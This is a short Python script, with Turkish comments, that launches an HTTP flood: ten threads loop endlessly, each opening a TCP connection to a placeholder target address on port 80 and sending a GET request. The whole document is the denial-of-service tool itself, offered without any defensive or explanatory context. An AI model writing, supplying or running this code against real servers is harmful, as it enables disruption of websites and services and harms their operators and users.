import socket
import threading

target_ip = "hedef_ip_adresi"
target_port = 80

def ddos_attack():
    while True:
        try:
            # Bağlantı oluşturma ve veri gönderme
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            sock.close()
            print("Paket gönderildi!")
        except:
            print("Bağlantı hatası!")

for i in range(10):
    thread = threading.Thread(target=ddos_attack)
    thread.start()
